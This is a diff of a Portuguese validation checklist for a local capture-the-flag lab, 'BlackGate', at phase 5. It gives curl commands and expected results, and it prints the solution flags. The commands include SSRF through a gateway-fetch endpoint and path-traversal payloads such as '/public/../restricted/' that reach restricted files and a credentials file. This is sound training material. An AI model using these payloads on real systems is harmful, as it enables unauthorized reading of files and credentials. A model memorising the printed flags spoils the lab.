@@ -1,4 +1,4 @@
-# Validação - Lab 05 BlackGate - Fase 4
+# Validação - Lab 05 BlackGate - Fase 5
 
 ## Escopo
 
@@ -41,10 +41,10 @@ curl -i -H "X-Debug-Token: guest-debug" http://localhost:8096/debug/ping
 Resultado esperado:
 
 - endpoints antigos continuam respondendo;
-- `/health` retorna `1.3.0-phase4`;
-- `/api/version` retorna build `bg-phase4-gateway-trust`;
-- debug com header retorna diagnostics de contexto e gateway limitados;
-- nenhum segredo real é exposto em rota pública.
+- `/health` retorna `1.4.0-phase5`;
+- `/api/version` retorna build `bg-phase5-files-vault`;
+- debug com header retorna diagnostics de contexto, gateway e files-vault limitados;
+- nenhuma flag aparece em rota pública.
 
 ## Login e token operator
 
@@ -74,36 +74,7 @@ Resultado esperado:
 FLAG{blackgate_weak_token_role_escalation_phase3}
 ```
 
-## Gateway metadata
-
-```bash
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  http://localhost:8096/api/operator/gateway-metadata
-```
-
-Resultado esperado:
-
-- `gateway_fetch`;
-- allowlist de hosts internos;
-- hint de Fase 4;
-- sem flag da Fase 4 nesse endpoint.
-
-## Gateway fetch health
-
-```bash
-curl -i -b /tmp/bg-cookie.txt \
-  -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
-```
-
-Resultado esperado:
-
-- HTTP 200;
-- `service: api-core`;
-- `network: internal`.
-
-## Gateway fetch flag
+## Fase 4 ainda funcional
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
@@ -117,7 +88,7 @@ Resultado esperado:
 FLAG{blackgate_gateway_trust_ssrf_phase4}
 ```
 
-## Files-vault metadata
+## Files Vault metadata
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
@@ -127,35 +98,80 @@ curl -i -b /tmp/bg-cookie.txt \
 
 Resultado esperado:
 
-- `storage_mode: document-catalog`;
+- `service: files-vault`;
+- `catalog`;
+- `read_endpoint`;
+- `download_endpoint`;
 - `safe_paths`;
-- `restricted_paths`;
-- hint para Fase 5.
+- `path_policy`.
 
-## Bloqueio externo
+## Files Vault catalog
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
   -H "X-BG-Context: $TOKEN" \
-  "http://localhost:8096/api/operator/gateway-fetch?url=http://example.com"
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/catalog"
+```
+
+Resultado esperado:
+
+- documentos públicos;
+- `restricted_index.enabled` como `false`;
+- sem flag.
+
+## Arquivo público
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/notices/migration-note.txt"
+```
+
+Resultado esperado:
+
+- HTTP 200;
+- conteúdo da nota de migração.
+
+## Flag da Fase 5
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/phase5-seed.txt"
+```
+
+Resultado esperado:
+
+```text
+FLAG{blackgate_files_vault_controlled_read_phase5}
+```
+
+## Bloqueio de path direto
+
+```bash
+curl -i -b /tmp/bg-cookie.txt \
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/restricted/phase5-seed.txt"
 ```
 
 Resultado esperado:
 
 - HTTP 403;
-- `blocked_upstream`.
+- `forbidden_path`.
 
-## Sem token
+## Bloqueio de credencial reservada
 
 ```bash
 curl -i -b /tmp/bg-cookie.txt \
-  "http://localhost:8096/api/operator/gateway-fetch?url=http://api-core.internal/health"
+  -H "X-BG-Context: $TOKEN" \
+  "http://localhost:8096/api/operator/gateway-fetch?url=http://files-vault.internal/read?path=/public/../restricted/legacy-panel-creds.txt"
 ```
 
 Resultado esperado:
 
-- erro `bad_request` ou `forbidden`;
-- nenhum acesso ao upstream simulado.
+- HTTP 403;
+- `redacted`;
+- nenhuma credencial real.
 
 ## Rotas autenticadas no navegador
 
@@ -165,6 +181,7 @@ Após login, validar:
 /dashboard
 /context
 /gateway
+/files-vault
 /tickets
 /assets
 /security-policy
